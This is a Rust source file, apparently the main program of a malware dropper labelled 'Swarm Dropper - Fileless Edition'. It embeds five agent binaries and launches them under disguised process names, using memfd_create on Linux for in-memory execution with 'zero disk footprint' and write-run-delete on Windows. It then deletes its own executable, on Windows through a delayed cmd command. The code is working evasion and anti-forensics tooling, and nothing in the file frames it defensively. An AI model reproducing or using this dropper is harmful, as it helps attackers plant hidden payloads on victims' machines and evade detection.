use tracing::{info, warn};
use std::env;
use std::thread;
use std::time::Duration;

// Agent binaries embedded at compile time
#[cfg(target_os = "windows")]
mod bins {
    pub const SCOUT: &[u8] = include_bytes!("../../target/debug/scout.exe");
    pub const SHAPER: &[u8] = include_bytes!("../../target/debug/shaper.exe");
    pub const HOARDER: &[u8] = include_bytes!("../../target/debug/hoarder.exe");
    pub const WEAVER: &[u8] = include_bytes!("../../target/debug/weaver.exe");
    pub const OVERMIND: &[u8] = include_bytes!("../../target/debug/overmind.exe");
}
#[cfg(not(target_os = "windows"))]
mod bins {
    pub const SCOUT: &[u8] = include_bytes!("../../target/debug/scout");
    pub const SHAPER: &[u8] = include_bytes!("../../target/debug/shaper");
    pub const HOARDER: &[u8] = include_bytes!("../../target/debug/hoarder");
    pub const WEAVER: &[u8] = include_bytes!("../../target/debug/weaver");
    pub const OVERMIND: &[u8] = include_bytes!("../../target/debug/overmind");
}

fn main() {
    hive_base::utils::init_logging("dropper");
    info!("Swarm Dropper v0.3.0 - Fileless Edition");
    info!("Agents execute from memory via memfd_create - zero disk footprint");

    // Generate a random arena name for shared memory IPC
    let arena_name = hive_base::shared_arena::generate_arena_name();
    info!("Arena: {}", arena_name);

    #[cfg(target_os = "linux")]
    {
        fileless_spawn("worker", bins::SCOUT, &arena_name);
        thread::sleep(Duration::from_secs(2));
        fileless_spawn("drone", bins::SHAPER, &arena_name);
        fileless_spawn("honeybee", bins::HOARDER, &arena_name);
        fileless_spawn("weaver", bins::WEAVER, &arena_name);
        fileless_spawn("queen", bins::OVERMIND, &arena_name);
    }

    #[cfg(target_os = "windows")]
    {
        let temp_dir = env::temp_dir().join(format!("swarm_{}", hive_base::utils::timestamp_now()));
        let _ = std::fs::create_dir_all(&temp_dir);

        let mut launch = |name: &str, data: &[u8]| {
            let path = temp_dir.join(format!("{}.exe", name));
            std::fs::write(&path, data).expect("write");
            let child = Command::new(&path).env("__HIVE_ARENA", &arena_name).spawn().expect("spawn");
            let _ = std::fs::remove_file(&path);
            child
        };

        let _s = launch("worker", bins::SCOUT);
        thread::sleep(Duration::from_secs(2));
        let _sh = launch("drone", bins::SHAPER);
        let _h = launch("honeybee", bins::HOARDER);
        let _w = launch("weaver", bins::WEAVER);
        let _o = launch("queen", bins::OVERMIND);
    }

    info!("Deployment complete. Swarm active via shared-memory IPC.");

    // Self-destruct
    let current_exe = env::current_exe().unwrap();
    info!("Self-destructing: {:?}", current_exe);

    #[cfg(target_os = "windows")]
    {
        let _ = Command::new("cmd")
            .args(&["/C", "choice", "/C", "Y", "/N", "/D", "Y", "/T", "2", "&", "Del", current_exe.to_str().unwrap()])
            .spawn();
    }
    #[cfg(target_os = "linux")]
    {
        let _ = std::fs::remove_file(&current_exe);
    }
}

#[cfg(target_os = "linux")]
fn fileless_spawn(name: &str, data: &[u8], arena_name: &str) {
    let memfd_name = format!("swarm_{}", name);
    match hive_base::MemfdBinary::new(&memfd_name, data) {
        Ok(memfd) => {
            let _ = memfd.seal();
            let envs = vec![("__HIVE_ARENA", arena_name)];
            match memfd.spawn(&envs) {
                Ok(child) => {
                    info!("Fileless spawn: {} (PID: {}, fd: {})", name, child.id(), memfd.raw_fd());
                }
                Err(e) => {
                    warn!("Failed to spawn {} from memfd: {}", name, e);
                }
            }
        }
        Err(e) => {
            warn!("memfd_create failed for {}: {}", name, e);
        }
    }
}
